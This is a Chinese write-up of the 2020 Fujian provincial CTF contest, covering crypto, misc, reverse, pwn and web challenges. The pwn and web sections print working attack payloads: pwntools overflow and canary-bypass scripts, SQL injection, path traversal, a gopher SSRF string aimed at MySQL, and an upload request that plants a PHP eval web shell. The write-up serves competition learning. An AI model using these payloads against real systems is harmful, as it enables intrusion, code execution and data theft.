# 2020年国家网络安全宣传周福建省网络空间安全技能竞赛CTF-Writeup总结

阅读量 **361715**

发布时间 : 2020-09-18 16:30:43

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01b8357918dc0bb510.jpg)

## Crypto-Factor

明显的RSA,将n分解得三个因数：

p=[
_11761833764528579549_](http://www.factordb.com/index.php?id=1100000001489178413)

q=[
_17100682436035561357_](http://www.factordb.com/index.php?id=1100000001489178411)

r=[
_17172929050033177661_](http://www.factordb.com/index.php?id=1100000001489178414)

下面求n得欧拉函数，当直接phi=(p-1) _(q-1)_
(r-1)时，发现e和phi有公约数，求不出私钥d,使用gcd发现，e和p有最大公约数3，因此得

    
    
    from libnum import *
    
    def gcd(a, b):
        if a < b:
            a, b = b, a
        while b != 0:
            temp = a % b
            a = b
            b = temp
        return a
    
    n = 3454083680130687060405946528826790951695785465926614724373
    c = 1347530713288996422676156069761604101177635382955634367208
    p = 17100682436035561357
    q = 11761833764528579549
    r = 17172929050033177661
    e = 3
    print(gcd(p - 1, e), gcd(q - 1, e), gcd(r - 1, e))
    inve_qr = invmod(e, (q - 1) * (r - 1))
    invd = (e * inve_qr, (q - 1) * (r - 1))
    m = pow(c, inve_qr, q * r)
    print(n2s(m))
    
    # CMISCCTF{3_RSA}

## Crypto-Change

2019百越杯和高校网安运维赛的原题。

    
    
    import gmpy2
    from libnum import invmod, n2s
    
    c = 182812482972168423884795132699225934365072979206288632257180603530046820174392675977209758378734399146216742345585898385168866887000708558119959898992294085847474548306743585711154035585848291290988967352517174312220756638881837930962458861193652684492265539096477345065113556380573776423787885892688197584678128636231428194711357642971544417113415626331810909274966752557628893585198569815939514862013512237657828262360291726912615575646318630641527418369988268899879152029186728850816178597399494254385226049249357897840618728804680238123954207656671747782543031545429711152272581734051959578453680011676521727918037340906791388178004979453256050227967701258768070039292546964652071924183467364467145178290753361477912582242961929982420950384199259355122986865808523351306098081481072454093823090
    n = 438980397031315392229453908048509540832246041631432878509579665664182747463100230160823865621798053164989325086085003940181731721089701380743698761443812523024144817205902380903062054138730658451286904347536210833160924917347633148983052015550354913154312162901555870494273903714349869746793861874257201085777893961715468950661641778512110325457371446203379767458862059193946434683324578530163650541637261158037041205642428802942295011562277084687025213626698849526240663754073508102229066475773893638716845176469070938803298515155140240970836387785401085919369741520890271902332951669953411373633688944162470994856654604872287103746922041844065053274059990595496159866206551119361036237431289830985174384522423364811997241255005514248198447925396378192915553898993758660041223393168707380580012437
    e = 65537
    n1 = n // (10 ** 600)
    n2 = (n // (10 ** 400)) % (10 ** 200)
    n3 = (n // (10 ** 200)) % (10 ** 200)
    n4 = n % (10 ** 200)
    AB = 0
    if ((n2 // 10 ** 199) >= n4 // (10 ** 199)):  # 未进位情况
        AB = n1 * (10 ** 200) + n4
    else:  # 进位情况
        AB = (n1 - 1) * (10 ** 200) + n4
    A2B2 = (n - AB * (10 ** 400 + 1)) // (10 ** 200)  # A*A+B*B
    AaddB = int(gmpy2.iroot(A2B2 + 2 * AB, 2)[0])  # A+B
    A_B = int(gmpy2.iroot((A2B2 - 2 * AB), 2)[0])  # A-B
    A = (AaddB + A_B) // 2
    B = (AaddB - A_B) // 2
    p = A * (10 ** 200) + B
    q = B * (10 ** 200) + A
    phi = (p - 1) * (q - 1)
    invd = invmod(e, phi)
    m = pow(c, invd, n)
    print(n2s(m))
    
    # CMISCCTF{easy_math_game_hhhhhhh}

## Crypto-Round

凯撒密码。

    
    
    def change(c, i):
        num = ord(c)
        if (num >= 33 and num <= 126):
            num = 33 + (num + i - 33) % (94)  # 126-33=93
        return chr(num)
    
    
    def kaisa_jiAmi(string, i):
        string_new = ''
        for s in string:
            string_new += change(s, i)
        print(string_new)
        return string_new
    
    
    def kaisa_jiEmi(string):
        for i in range(0, 94):
            print('第' + str(i + 1) + '种可能:', end='  ')
            # 区别在于 string 是该对象原本就是字符串类型, 而 str()则是将该对象转换成字符串类型。
            kaisa_jiAmi(string, i)
    
    
    # 你要知道input输入的数据类型都是string
    def main():
        kaisa_jiEmi(':D@J::K=r<ecXi^\[V:X\jXit')
    
    
    if __name__ == '__main__':
        main()
    # CMISCCTF{Enlarged_Caesar}

## Misc-blue

binwalk -e分离出pcapng流量包，查看发送是sql注入流量，分析流量获得flag

![](https://p4.ssl.qhimg.com/t01f25abc2e102da832.png)

![](https://p2.ssl.qhimg.com/t010774a6c1f4f53c12.png)

flag{Gre4t_jOB_ON_This_Blue_sh4rk}

## Misc-BURPS

发现原始文件很小猜测CRC32碰撞

![](https://p2.ssl.qhimg.com/t01b3f88a9e19424181.png)

[_CRC32_ _碰撞脚本:
https://github.com/theonlypwner/crc32_](https://github.com/theonlypwner/crc32)

将1-6.txt的校验码提取出来，然后使用脚本碰撞。

![](https://p5.ssl.qhimg.com/t01185bf64becc65e13.png)

![](https://p4.ssl.qhimg.com/t01b4715a59bbc646d2.png)

得到解压密码

the_password_here_cipher

解压得到flag

CMISCCTF{how_to_burp_by_coding}

## Misc-encrypt

zip伪加密，修改hex为00后解压再解两次base64。

CMISCCTF{Fake_encryption}

## Misc-TREES

解压得到一张图片

使用stegsolve软件打开图片

打开red plane7通道

![](https://p3.ssl.qhimg.com/t01e83c5fefeb32602e.png)

发现可以看到一些点组成的字母

观察可得flag，值得注意的是的是中间有一个下划线

CMISCCTF{coconut_tree}

## Misc-QRCODE

得到一张残缺的二维码

![](https://p0.ssl.qhimg.com/t0159b46365e2fb02e8.png)

[_残缺二维码修复在线网站：https://merricx.github.io/qrazybox/_](https://merricx.github.io/qrazybox/)

使用在线修复网站，二维码是version4 版本，尺寸33×33，把这一半填好

![](https://p3.ssl.qhimg.com/t0138e37103b720b6fe.png)

然后像灰色的地方添白

![](https://p5.ssl.qhimg.com/t01517e7e9f7d98c56b.png)

得到

![](https://p4.ssl.qhimg.com/t01e772d35a7841f635.png)

扫描识别

![](https://p1.ssl.qhimg.com/t0142e94c597bc86c3b.png)

CMISCCTF{qr_c0de_r3c0very}

## Misc-Blind

题目一张图blind.png，一个enc.rar的压缩包，压缩包有密码

密码应该应该藏在png

Binwlak分析

![](https://p4.ssl.qhimg.com/t018ffb40852d4e8fa9.png)

发现还有一张图片 分离出来，发现两张图片一样，盲水印解一下。

![](https://p4.ssl.qhimg.com/t01ab3c5b93b305cafa.png)

解压密码：Q@CTF@NX，得到ctfer.png。

![](https://p4.ssl.qhimg.com/t01e7d485cc0e20bfaf.png)

010分析

![](https://p0.ssl.qhimg.com/t011debef48c5a41456.png)

选中第二张图片 插入文件头

![](https://p3.ssl.qhimg.com/t016328fa8815bd50db.png)

得到flag

CMISCCTF{double_picture}

## Misc-music

解压题目附件得到music.wav

![](https://p2.ssl.qhimg.com/t01f72c1cb1227fbe54.png)

正放和反放没听出什么特征出来，看特征高低振幅明显，使用脚本对高低振幅转换为01，高振幅为1，低振幅为0，使用python脚本转换，并且将转换出来的01二进制文件流，八个一组转换为两位十六进制，然后将十六进制文件流写入文件内，脚本如下

    
    
    import numpy as np
    import struct
    import wave
    import re
    
    
    def write_records(records, format, f):
        #Write a sequence of tuples to a binary file of structures.
        record_struct = Struct(format)
        for r in records:
            f.write(record_struct.pack(*r))
    
    path = "./music.wav"
    f = wave.open(path, "rb")
    # 读取格式信息
    # (nchannels, sampwidth, framerate, nframes, comptype, compname)
    params = f.getparams()
    nchannels, sampwidth, framerate, nframes = params[:4]
    # 读取波形数据
    str_data = f.readframes(nframes)
    f.close()
    #将波形数据转换为数组
    wave_data = np.fromstring(str_data, dtype=np.short)
    b = ''
    # arr = [elem for elem in wave_data if elem >0]
    max = 0
    d = ''
    for i in wave_data:
        if i <0:
            if max !=0:
                if max<25000:
                    d +='0'
                else:
                    d += '1'
                    pass
            max = 0
        if max < i:
            max = i
    
    print(d)
    print("\n\n\n\n")
    a = re.findall(r'.{8}',d)
    hex_list=[]
    for i in a:
        res = hex(int(i,2))
        hex_list.append(res)
    print(hex_list)
    
    with open("result.txt","wb") as f:
        for x in hex_list:
            s = struct.pack('B',int(x,16))
            f.write(s)

使用010 editor打开发现是RAR的头文件，修改文件后缀为.rar

![](https://p3.ssl.qhimg.com/t01c209a18fa6194aa1.png)

解压得到

![](https://p0.ssl.qhimg.com/t01b38ca4a8a15b8edb.png)

nnnnoflag.txt并没有flag内容，rar的压缩包中也无其他内容，猜测这里有NTFS文件流隐写

使用ntfsstreamseditor扫描nnnnoflag.txt的目录

发现隐写了张图片，导出图片得到如下半张二维码

![](https://p0.ssl.qhimg.com/t01a22070a158fa1bbc.png)

猜测图片有可能修改了宽高，使用01 editor修改十六进制高度和宽度相同为：01 18

![](https://p2.ssl.qhimg.com/t01ddeb976609aab60c.png)

![](https://p4.ssl.qhimg.com/t01b78e4b717648b0bd.png)

扫描得到flag

flag{4dcfda814ec9fd4761c1139fee3f65eb}

## Reverse-Check

Angr +符号执行

    
    
    #define MAX_SIZE 0x40
    #include <stdio.h>
    #include <stdlib.h>
    
    unsigned char check[] = {
      0x03, 0x12, 0x1a, 0x17, 0x0a, 0xec, 0xf2, 0x14, 0x0e, 0x05, 0x03, 0x1d,
      0x19, 0x0e, 0x02, 0x0a, 0x1f, 0x07, 0x0c, 0x01, 0x17, 0x06, 0x0c, 0x0a,
      0x19, 0x13, 0x0a, 0x16, 0x1c, 0x18, 0x08, 0x07, 0x1a, 0x03, 0x1d, 0x1c,
      0x11, 0x0b, 0xf3, 0x87, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x05
    };
    
    
    int reverse(unsigned char *a1) {
      int k; // [rsp+0h] [rbp-18h]
      int j; // [rsp+4h] [rbp-14h]
      int i; // [rsp+8h] [rbp-10h]
    
      for ( i = 0; i < MAX_SIZE; ++i )
        a1[i] += 5;
      for ( j = 0; j < MAX_SIZE - 1; ++j )
        a1[j] ^= a1[j + 1];
      for ( k = 0; ; ++k )
      {
        if ( k >= MAX_SIZE )
          return 1;
        if ( check[k] != a1[k] )
          break;
      }
      return 0LL;
    }
    
    
    int main(int argc, char *argv[]) {
            char flaggie[0x50];
    
            read(0, flaggie, 0x40);
        return reverse(flaggie);
    }

使用以下命令编译为二进制文件

    
    
    gcc source.c -no-pie -o flag

然后。

    
    
    import angr
    
    p = angr.Project('./flag')
    pg = p.factory.simulation_manager()
    # find is the addr for the "good case" we want to reach
    # avoid is the "bad case"
    e = pg.explore(find=0x0040120d, avoid=0x0040123f)
    if len(e.found) > 0:
    print(e.found[0].posix.dumps(0))

得到flag

CMISCCTF{machine_agnostic_that_not_easy}

## Reverse-Crackme

反编译后发现用户名和密码进行计算产生一个值 a1, a1进行接下来的计算 找到关键计算部分：

    
    
    v3 = 3114571393449336878LL;
    v4 = 3609637387099048214LL;
    v5 = 649376180647958543LL;
    v6 = 16916018;
    v7 = 2075;
    v8 = 16;
    for ( i = 0; i <= 30; ++i )
      putchar(a1 ^ *((char *)&v3 + i));

其中这几个数据类型识别有问题，正常应该是char数组

转换后依次尝试a1的值，找到一个这样的字符串：FTCCSIMC_uoy_od{dna_prublos_ev}

将该字符串倒序，分组、拼接即得flag：

CMISCCTF{do_you_burp_and_solve}

## Pwn_cmcc_stack

惯例checksec，只开了NX保护，四舍五入就是没有保护

拖入IDA，发现当v5的值为-559038737（0xdeadbeef）时可以getflag

![](https://p3.ssl.qhimg.com/t0149f18bd572769942.png)

![](https://p2.ssl.qhimg.com/t01fa99138a1ec8e403.png)

read函数读入到地址esp+0x80-0x68，v5的地址是esp+0x7c，所以我们只需要覆盖掉v5的值为0xdeafbeef即可getflag

故构造payload如下

    
    
    from pwn import *
    pl = b'A'*0x64 + p32(0xdeadbeef)
    
    p = process('./bin')#p = remote('192.168.5.11',22987)
    p.sendline(pl)
    p.interactive()

![](https://p4.ssl.qhimg.com/t0161436125b44f2997.png)

## Pwn_canary

惯例的checksec，开了NX保护和Canary，说明我们不能像之前那样轻松地溢出了，需要绕过Canary

拖入IDA进行分析，我们可以发现在fun()函数处存在溢出，偏移量为0x70，故考虑绕过canary后控制程序返回至getflag()

![](https://p5.ssl.qhimg.com/t018b65cb9fa2d179a1.png)

![](https://p3.ssl.qhimg.com/t0131557b237630f2ae.png)

![](https://p1.ssl.qhimg.com/t0127bc649ff4e34cda.png)

如何绕过canary？在main函数中我们可以看到其先读入format再输出format，存在格式化字符串漏洞，我们可以利用这个来输出canary的值，再覆盖掉即可

故构造payload如下

    
    
    from pwn import *
    pl1 = '%7$x'
    get_flag = 0x804863d
    
    p = process('./canary')#p = remote('192.168.5.11',39274)
    p.sendline(pl1)
    cnry = int(p.recv(),16)
    pl2 = 26*p32(cnry) + p32(get_flag)
    p.sendline(pl2)
    p.interactive()

得到flag

![](https://p0.ssl.qhimg.com/t01240b3e2e9ea204c7.png)

## Web-eeasyweb

伪协议读。

GET /?page=php://filter/read=convert.base64-encode/resource=flag.php

# flag{web_eeasyweb}

## Web-Greatctf

修改xff为127.0.0.1，宽字节注入。

usernmae=admin%df’||1=1#password=admin

提示:flag in the http://ip/greatctfea5y55rf/。

访问提示swp泄露，再访问.index.php.swp。

    
    
    <?php
    $argv[1]=$_GET['a'];
    if(filter_var($argv[1],FILTER_VALIDATE_URL))
    {
            $r = parse_url($argv[1]);
            print_r($r);
            if(preg_match('/great\.ctf$/',$r['host']))
            {
                    $a=file_get_contents($argv[1]);
                    echo($a);
            }else
            {
                    echo("error");
            }
    
    }else
    {
            echo "Error:Invalid URL; WhereIsSourceCode ";
    }
    ?>

构造。

GET ?a=south://great.ctf/../../../../../../../../flag.txt  
# flag{greatctf}

## Web-simplebrowser

源代码提示

我的flag都放在数据库ctfcontest里，你用admin账户就能访问到，快去找吧！

推测是gopher打mysql，gopherus一把梭。

python gopherus.py –exploit mysql

________ .__  
/ _____/ ____ ______ | |__ ___________ __ __ ______  
/ \ ___ / _ \\\\____ \| | \\_/ __ \\_ __ \ | \/ ___/  
\ \\_\ ( <_> ) |_> > Y \ ___/| | \/ | /\\___ \  
\\______ /\\____/| __/|___| /\\___ >__| |____//____ >  
\/ |__| \/ \/ \/

author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: admin  
Give query to execute: use ctfcontest;show tables;select * from flag;

Your gopher link is ready to do SSRF :

gopher://127.0.0.1:3306/_%a4%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%61%64%6d%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%2f%00%00%00%03%75%73%65%20%63%74%66%63%6f%6e%74%65%73%74%3b%73%68%6f%77%20%74%61%62%6c%65%73%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%3b%01%00%00%00%01

flag{wqweb_simplebrowser}

## Web-aurorawebsit

右键源代码有提示，进入上传页面后，Content-Type绕过。

burpsuite不停发包，浏览器不停刷新访问shell就行。

    
    
    POST /h1dden_aurora_hochladen.php HTTP/1.1
    Host: 172.1.2.15
    Content-Length: 323
    Cache-Control: max-age=0
    Origin: http://172.1.2.15
    Upgrade-Insecure-Requests: 1
    DNT: 1
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIkStpUBRiMXKspD4
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://172.1.2.15/h1dden_aurora_hochladen.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    x-forwarded-for: 127.0.0.1
    Connection: close
    
    ------WebKitFormBoundaryIkStpUBRiMXKspD4
    Content-Disposition: form-data; name="upload_file"; filename="south.php"
    Content-Type: image/jpeg
    
    <?php
    eval($_GET['south']);
    ?>
    
    ------WebKitFormBoundaryIkStpUBRiMXKspD4
    Content-Disposition: form-data; name="submit"
    
    ä¸ä¼ 
    ------WebKitFormBoundaryIkStpUBRiMXKspD4--
得到flag。

flag{aurorawebsit}

##

## 活动简介

网络空间的竞争，归根到底是人才的竞争。9月12日至13日，由省委网信办、省教育厅、省公安厅联合主办的2020年国家网络安全宣传周福建省网络空间安全技能竞赛高校学生组暨“黑盾杯”赛项成功举办。

竞赛详情了解：<http://www.si.net.cn/>

解题思路来源：厦门理工学院_CodeMonster战队

承办单位:福建师范大学、福建广电网络集团  
协办单位:福建省网络与信息安全产业发展促进会、福建省互联网协会、福建省网络安全与密码技术重点实验室、福建省计算机学会网络与信息安全专业委员会、福建省信息网络重点实验室、福建省海峡信息技术有限公司、福建国科信息科技有限公司

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **海峡信息** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/217798](/post/id/217798)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __2赞

 __收藏

![](https://p3.ssl.qhimg.com/t01a22d41fb09a4e799.png) 海峡信息

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

